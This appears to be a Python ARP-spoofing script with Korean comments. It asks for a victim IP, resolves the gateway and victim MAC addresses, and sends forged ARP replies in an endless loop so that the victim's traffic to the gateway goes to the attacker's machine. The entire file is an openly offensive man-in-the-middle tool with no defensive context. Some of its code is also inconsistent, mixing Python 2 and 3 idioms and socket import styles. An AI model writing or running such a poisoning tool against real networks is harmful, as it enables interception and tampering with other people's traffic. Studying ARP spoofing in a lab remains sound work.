#!/usr/bin/python
#-*- coding: utf-8 -*-

from socket import *
from scapy.all import*
from uuid import getnode as get_mac
import codecs
import struct

def trans_ip(addr):
    print(type(addr))
    addr=addr.split('.')
    print(addr)
    for i in range(4):
        print(addr[i])
        addr[i]=chr(eval(addr[i]))
        print("=============")
        print(addr[i])
    print(addr)
    addr=''.join(addr)
    print(addr)
    return addr

def trans_mac(mac):
	mac=mac.split(':')
	for i in range(6):
		mac[i]=codecs.decode(mac[i], 'hex')
	mac=b''.join(mac)
	return mac

reverse_ip = lambda addr : '.'.join(map(lambda x : str(ord(x)), [x for x in addr]))
# 헤더로부터 받은 IP 주소를 아스키 값을 숫자로 나타내주며 이를 문자열 형태로 저장한다.
reverse_mac = lambda mac : ':'.join(map(lambda x : x.encode('hex'), [x for x in mac]))
# 헤더로부터 받은 MAC 주소를 hex 값으로 encode 후 'ff:ff:ff:ff:ff:ff' 형태로 표현해준다.
p16 = lambda x : struct.pack('>H', x)
#인자를 받아 unsigned short int / big_endian 형태로 패킹을 한다.  
p32 = lambda x : struct.pack('>I', x)
#인자를 받아 short int / big_endian 형태로 패킹을 한다.
#패킹을 하는 이유는 바이너리 데이터로 표현하여 네트워크 통신을 하기 위함이다.
u16 = lambda x : struct.unpack('>H', x)[0]
#인자를 받아 unsigend short int / big_endian 형태의 데이터를 언패킹한다.
u32 = lambda x : struct.unpack('>I', x)[0]
#인자를 받아 short int / big_endian 형태의 데이터를 언패킹한다. 


def socketsend(attacker_mac,gw_ip,victim_ip,victim_mac):

	rawSocket = socket.socket(socket.AF_PACKET, SOCK_RAW, htons(0x0800))
	rawSocket.bind(("enp0s5", htons(0x0800)))
	source_mac = attacker_mac        # sender mac address
	source_ip  = gw_ip           # sender ip address
	dest_mac = victim_mac   # target mac address
	dest_ip  = victim_ip             # target ip address

	# Ethernet Header
	protocol = 0x0806                       # 0x0806 for ARP


	#dest_mac=float(dest_mac)
	eth_hdr=trans_mac(dest_mac)
	eth_hdr+=trans_mac(source_mac)
	eth_hdr+=p16(protocol)

	htype = 0x1                               # Hardware_type ethernet
	ptype = 0x0800                          # Protocol type TCP
	hlen = 0x6                                # Hardware address Len
	plen = 0x4                                # Protocol addr. len
	operation = 0x2                           # 1=request/2=reply
	arp_hdr=b''
	arp_hdr+=p16(htype)# Hardware_type ethernet
	arp_hdr+=p16(ptype)# Protocol type TCP
	arp_hdr+=chr(hlen).encode()# Hardware address Len
	arp_hdr+=chr(plen).encode()# Protocol addr. len                            
	arp_hdr+=p16(operation)# 1=request/2=reply
	arp_hdr+=trans_mac(source_mac)
	arp_hdr+=socket.inet_aton(source_ip)
	arp_hdr+=trans_mac(dest_mac)
	arp_hdr+=socket.inet_aton(dest_ip)

	packet = eth_hdr + arp_hdr
	rawSocket.send(packet)
	print("send socket")

def macadd(ip) :
	a=ARP()
	a.pdst=ip
	get=sr1(a)
	b=get.hwsrc

	return b


def get_ipaddress():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("gmail.com",80))
	r = s.getsockname()[0]
	s.close()
	return r

if __name__ == '__main__':
	attackerIP=get_ipaddress()
	print(attackerIP)

	gatewayIP= attackerIP[:-1]+str(1)
	#gatewayIP= ("192.168.0.1")
	gateway_mac= macadd(gatewayIP)
	victimIP= input('victim IP: ')
	victim_mac= macadd(victimIP)
	attackerMac=get_mac()
	attackerMac=':'.join(("%012X" %attackerMac)[i:i + 2] for i in range(0,12,2))
	
	print(attackerIP)
	print(gatewayIP)
	print(victimIP)
	print(attackerMac)
	print(gateway_mac)
	print(victim_mac)

	while True:
		socketsend(attackerMac,gatewayIP,victimIP,victim_mac)